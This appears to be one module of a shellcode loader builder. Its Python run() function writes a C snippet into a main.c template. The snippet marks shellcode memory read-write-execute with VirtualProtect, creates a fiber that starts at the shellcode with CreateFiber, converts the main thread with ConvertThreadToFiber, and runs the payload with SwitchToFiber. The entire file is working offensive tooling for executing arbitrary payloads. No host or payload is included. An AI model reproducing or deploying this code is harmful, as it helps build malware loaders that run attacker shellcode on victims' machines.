def desc():
    return "Use a local fiber to run the payload"

def run():
    execution = '''\
    // Making it executable
    DWORD dwOldProtection = NULL;
    VirtualProtect(pShellcode, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection);
    
	LPVOID	PrimaryFiberAddress		= NULL,
		    ShellcodeFiberAddress	= NULL;

	// Create a fiber object, stack, and set up execution to begin at the specified start address (Payload). This fiber is not yet scheduled for execution.
	ShellcodeFiberAddress = CreateFiber(0x00, (LPFIBER_START_ROUTINE)pShellcode, NULL);

	// Converts the current (main) thread into a fiber
	PrimaryFiberAddress = ConvertThreadToFiber(NULL);

	// Schedules the shellcode fiber. "SwitchToFiber" can only be called from another fiber, which is in this case the 'PrimaryFiberAddress' fiber.
	SwitchToFiber(ShellcodeFiberAddress);\
'''
    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{EXECUTION}}", execution)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)
    
    return